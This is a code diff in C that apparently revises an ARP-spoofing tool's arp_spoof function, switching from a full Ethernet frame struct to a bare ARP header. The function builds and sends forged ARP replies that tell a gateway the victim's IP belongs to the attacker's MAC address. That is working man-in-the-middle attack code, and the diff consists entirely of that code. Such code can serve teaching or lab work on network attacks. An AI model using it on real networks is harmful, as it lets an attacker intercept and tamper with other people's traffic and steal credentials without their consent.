@@ -151,7 +151,8 @@ void request_mac(int asfd, const char *if_name, struct ether_arp *req, uint32_t 
 
 void arp_spoof(int rsfd, const char *if_name, const unsigned char *attacker_mac, uint32_t gateway_ip, const unsigned char *gateway_mac, uint32_t victim_ip) {
 	
-	struct arp_frame resp;
+	// struct arp_frame resp;
+	struct ether_arp arp_hdr;
     // struct ether_arp resp;
 	struct ifreq ifr;
 	set_ifr_name(&ifr, if_name);
@@ -163,27 +164,27 @@ void arp_spoof(int rsfd, const char *if_name, const unsigned char *attacker_mac,
 	addr.sll_protocol       = htons(ETH_P_ARP);
 	memcpy(addr.sll_addr, gateway_mac, ETHER_ADDR_LEN);
 
-	memcpy(&resp.eth_hdr.ether_dhost,gateway_mac,sizeof(resp.eth_hdr.ether_dhost));
-	memcpy(&resp.eth_hdr.ether_shost,attacker_mac,sizeof(resp.eth_hdr.ether_shost));
-	resp.eth_hdr.ether_type = htons(ETHERTYPE_ARP);
+	// memcpy(&resp.eth_hdr.ether_dhost,gateway_mac,sizeof(resp.eth_hdr.ether_dhost));
+	// memcpy(&resp.eth_hdr.ether_shost,attacker_mac,sizeof(resp.eth_hdr.ether_shost));
+	// resp.eth_hdr.ether_type = htons(ETHERTYPE_ARP);
 
-	resp.arp_hdr.arp_hrd = htons(ARPHRD_ETHER); 
-	resp.arp_hdr.arp_pro = htons(ETH_P_IP);
-	resp.arp_hdr.arp_hln = ETHER_ADDR_LEN;
-	resp.arp_hdr.arp_pln = sizeof(in_addr_t);
-	resp.arp_hdr.arp_op  = htons(ARPOP_REPLY);
+	arp_hdr.arp_hrd = htons(ARPHRD_ETHER); 
+	arp_hdr.arp_pro = htons(ETH_P_IP);
+	arp_hdr.arp_hln = ETHER_ADDR_LEN;
+	arp_hdr.arp_pln = sizeof(in_addr_t);
+	arp_hdr.arp_op  = htons(ARPOP_REPLY);
 
 	// resp.arp_hrd = htons(ARPHRD_ETHER);
 	// resp.arp_pro = htons(ETH_P_IP);
 	// resp.arp_hln = ETHER_ADDR_LEN;
 	// resp.arp_pln = sizeof(in_addr_t);
 
-	memcpy(&resp.arp_hdr.arp_sha, attacker_mac, sizeof(resp.arp_hdr.arp_sha));
-	memcpy(&resp.arp_hdr.arp_spa, &victim_ip, sizeof(resp.arp_hdr.arp_spa));
-	memcpy(&resp.arp_hdr.arp_tha, gateway_mac, sizeof(resp.arp_hdr.arp_tha));
-	memcpy(&resp.arp_hdr.arp_tpa, &gateway_ip, sizeof(resp.arp_hdr.arp_tpa));
+	memcpy(&arp_hdr.arp_sha, attacker_mac, sizeof(arp_hdr.arp_sha));
+	memcpy(&arp_hdr.arp_spa, &victim_ip, sizeof(arp_hdr.arp_spa));
+	memcpy(&arp_hdr.arp_tha, gateway_mac, sizeof(arp_hdr.arp_tha));
+	memcpy(&arp_hdr.arp_tpa, &gateway_ip, sizeof(arp_hdr.arp_tpa));
 
-	if(sendto(rsfd,(void *)&resp, sizeof(resp), 0, (struct sockaddr *)&addr, sizeof(addr)) <= 0) 
+	if(sendto(rsfd,(void *)&arp_hdr, sizeof(arp_hdr), 0, (struct sockaddr *)&addr, sizeof(addr)) <= 0) 
 		die(strerror(errno));
 
 }
